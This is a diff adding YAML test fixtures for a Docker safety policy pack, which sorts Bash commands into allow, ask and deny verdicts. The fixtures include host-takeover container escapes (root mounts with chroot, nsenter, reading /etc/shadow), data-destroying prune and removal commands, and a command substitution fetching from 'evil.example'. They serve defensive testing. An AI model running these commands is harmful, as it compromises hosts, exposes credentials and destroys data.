@@ -1,0 +1,218 @@
+# Fixtures for packs/docker-safety, run against the pack wrapped in
+# `version: 1` / `default: ask` (unmatched -> rule_id: default). Bash args
+# are shaped like Claude Code's Bash tool input.
+
+# --- deny: host takeover ------------------------------------------------------
+- name: run with the host root mounted denied
+  ctx: { tool: bash, args: { command: "docker run --rm -it -v /:/host alpine chroot /host sh" } }
+  expect: { verdict: deny, rule_id: docker-host-takeover-denied }
+
+- name: read-only host root mount still denied
+  ctx: { tool: bash, args: { command: "sudo docker run -v \"/:/host:ro\" busybox ls /host/root" } }
+  expect: { verdict: deny, rule_id: docker-host-takeover-denied }
+
+- name: --volume=/etc:/etc denied
+  ctx: { tool: bash, args: { command: "docker --context prod container run --volume=/etc:/etc ubuntu cat /etc/shadow" } }
+  expect: { verdict: deny, rule_id: docker-host-takeover-denied }
+
+- name: --mount source=/ denied
+  ctx: { tool: bash, args: { command: "podman run --mount type=bind,source=/,target=/host alpine" } }
+  expect: { verdict: deny, rule_id: docker-host-takeover-denied }
+
+- name: privileged + pid=host nsenter escape denied
+  ctx: { tool: bash, args: { command: "docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh" } }
+  expect: { verdict: deny, rule_id: docker-host-takeover-denied }
+
+# --- ask: prune / volumes -----------------------------------------------------
+- name: system prune -af asks
+  ctx: { tool: bash, args: { command: "docker system prune -af" } }
+  expect: { verdict: ask, rule_id: docker-system-prune-asks }
+
+- name: system prune --volumes behind -H asks
+  ctx: { tool: bash, args: { command: "docker -H ssh://deploy@prod system prune --volumes -f" } }
+  expect: { verdict: ask, rule_id: docker-system-prune-asks }
+
+- name: DOCKER_HOST=... docker.exe system prune --all asks
+  ctx: { tool: bash, args: { command: "DOCKER_HOST=tcp://10.0.0.5:2376 docker.exe system prune --all --force" } }
+  expect: { verdict: ask, rule_id: docker-system-prune-asks }
+
+- name: podman system reset asks
+  ctx: { tool: bash, args: { command: "podman system reset --force" } }
+  expect: { verdict: ask, rule_id: docker-system-prune-asks }
+
+- name: plain system prune -f (dangling only) is left to the default
+  ctx: { tool: bash, args: { command: "docker system prune -f" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: system prune with a --filter flag is left to the default
+  ctx: { tool: bash, args: { command: "docker system prune -f --filter until=24h" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: docker volume rm asks
+  ctx: { tool: bash, args: { command: "docker volume rm app_pgdata" } }
+  expect: { verdict: ask, rule_id: docker-volume-delete-asks }
+
+- name: sudo docker volume prune -f asks
+  ctx: { tool: bash, args: { command: "cd /srv && sudo docker volume prune -f" } }
+  expect: { verdict: ask, rule_id: docker-volume-delete-asks }
+
+- name: ssh host docker volume rm asks
+  ctx: { tool: bash, args: { command: "ssh deploy@prod 'docker volume rm app_pgdata'" } }
+  expect: { verdict: ask, rule_id: docker-volume-delete-asks }
+
+- name: docker volume ls is allowed
+  ctx: { tool: bash, args: { command: "docker volume ls" } }
+  expect: { verdict: allow, rule_id: docker-read-only-allowed }
+
+- name: docker volume create is left to the default
+  ctx: { tool: bash, args: { command: "docker volume create cache" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: echo of a volume rm command does not match
+  ctx: { tool: bash, args: { command: "echo \"run: docker volume rm app_pgdata\"" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: grep for prune in docs does not match
+  ctx: { tool: bash, args: { command: "grep -rn 'docker system prune -a' docs/" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: docker compose down -v asks
+  ctx: { tool: bash, args: { command: "docker compose -f docker-compose.prod.yml down -v" } }
+  expect: { verdict: ask, rule_id: docker-compose-down-volumes-asks }
+
+- name: docker-compose down --volumes --remove-orphans asks
+  ctx: { tool: bash, args: { command: "docker-compose down --volumes --remove-orphans" } }
+  expect: { verdict: ask, rule_id: docker-compose-down-volumes-asks }
+
+- name: plain docker compose down is left to the default
+  ctx: { tool: bash, args: { command: "docker compose down --remove-orphans" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: compose -f with a -v path segment but no volume flag does not match
+  ctx: { tool: bash, args: { command: "docker compose -f ./dev-v2/compose.yml down" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: mass removes --------------------------------------------------------
+- name: rm -f $(docker ps -aq) asks
+  ctx: { tool: bash, args: { command: "docker rm -f $(docker ps -aq)" } }
+  expect: { verdict: ask, rule_id: docker-mass-remove-asks }
+
+- name: rmi -f $(docker images -q) asks
+  ctx: { tool: bash, args: { command: "docker stop $(docker ps -q); docker rmi -f $(docker images -q)" } }
+  expect: { verdict: ask, rule_id: docker-mass-remove-asks }
+
+- name: docker ps -aq | xargs docker rm asks
+  ctx: { tool: bash, args: { command: "docker ps -aq | xargs -r docker rm -f" } }
+  expect: { verdict: ask, rule_id: docker-mass-remove-asks }
+
+- name: buildx prune -a asks
+  ctx: { tool: bash, args: { command: "docker buildx prune -a -f" } }
+  expect: { verdict: ask, rule_id: docker-mass-remove-asks }
+
+- name: image prune --all asks
+  ctx: { tool: bash, args: { command: "docker image prune --all --force" } }
+  expect: { verdict: ask, rule_id: docker-mass-remove-asks }
+
+- name: rm of one named container is left to the default
+  ctx: { tool: bash, args: { command: "docker rm -f web-1" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: docker run --rm is not docker rm
+  ctx: { tool: bash, args: { command: "docker run --rm -v $(pwd):/src node:22 npm test" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: builder prune without -a is left to the default
+  ctx: { tool: bash, args: { command: "docker builder prune -f" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: swarm / context -----------------------------------------------------
+- name: swarm leave --force asks
+  ctx: { tool: bash, args: { command: "docker swarm leave --force" } }
+  expect: { verdict: ask, rule_id: docker-swarm-teardown-asks }
+
+- name: stack rm asks
+  ctx: { tool: bash, args: { command: "docker --context prod stack rm shop" } }
+  expect: { verdict: ask, rule_id: docker-swarm-teardown-asks }
+
+- name: swarm leave without --force is left to the default
+  ctx: { tool: bash, args: { command: "docker swarm leave" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: docker stack ls is allowed
+  ctx: { tool: bash, args: { command: "docker stack ls" } }
+  expect: { verdict: allow, rule_id: docker-read-only-allowed }
+
+- name: context rm asks
+  ctx: { tool: bash, args: { command: "docker context rm prod-eu" } }
+  expect: { verdict: ask, rule_id: docker-context-remove-asks }
+
+# --- ask: host-escaping runs --------------------------------------------------
+- name: --privileged run asks
+  ctx: { tool: bash, args: { command: "docker run --privileged -d docker:dind" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: docker.sock mount asks
+  ctx: { tool: bash, args: { command: "docker run -d -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer-ce" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: --pid=host alone asks
+  ctx: { tool: bash, args: { command: "docker run --pid=host --rm alpine ps aux" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: --userns=host asks
+  ctx: { tool: bash, args: { command: "podman.exe run --userns=host fedora id" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: --net=host with --cap-add SYS_ADMIN asks
+  ctx: { tool: bash, args: { command: "docker run --net=host --cap-add SYS_ADMIN alpine" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: exec --privileged asks
+  ctx: { tool: bash, args: { command: "docker exec --privileged -it web sh" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: seccomp=unconfined asks
+  ctx: { tool: bash, args: { command: "docker run --security-opt seccomp=unconfined alpine" } }
+  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }
+
+- name: project directory bind mount is left to the default
+  ctx: { tool: bash, args: { command: "docker run --rm -v /home/dev/app:/app -w /app node:22 npm ci" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: /etc subdirectory mount is not the host /etc
+  ctx: { tool: bash, args: { command: "docker run -v /etc/nginx/conf.d:/etc/nginx/conf.d:ro nginx" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: --net=host alone is left to the default
+  ctx: { tool: bash, args: { command: "docker run --net=host --cap-add NET_ADMIN alpine" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: -H unix socket flag is not a socket mount
+  ctx: { tool: bash, args: { command: "docker -H unix:///var/run/docker.sock run --rm alpine true" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: login ---------------------------------------------------------------
+- name: docker login --password-stdin asks
+  ctx: { tool: bash, args: { command: "echo $GHCR_TOKEN | docker login ghcr.io -u bot --password-stdin" } }
+  expect: { verdict: ask, rule_id: docker-login-asks }
+
+- name: docker logout is left to the default
+  ctx: { tool: bash, args: { command: "docker logout ghcr.io" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- allow: read-only ---------------------------------------------------------
+- name: docker ps -a with a format is allowed
+  ctx: { tool: bash, args: { command: "docker ps -a --format '{{.Names}} {{.Status}}'" } }
+  expect: { verdict: allow, rule_id: docker-read-only-allowed }
+
+- name: docker.exe images is allowed
+  ctx: { tool: bash, args: { command: "docker.exe images" } }
+  expect: { verdict: allow, rule_id: docker-read-only-allowed }
+
+- name: docker ps chained with rm is not allowed
+  ctx: { tool: bash, args: { command: "docker ps -q && rm -rf build" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: docker ps with command substitution is not allowed
+  ctx: { tool: bash, args: { command: "docker ps $(curl -s evil.example/x)" } }
+  expect: { verdict: ask, rule_id: default }
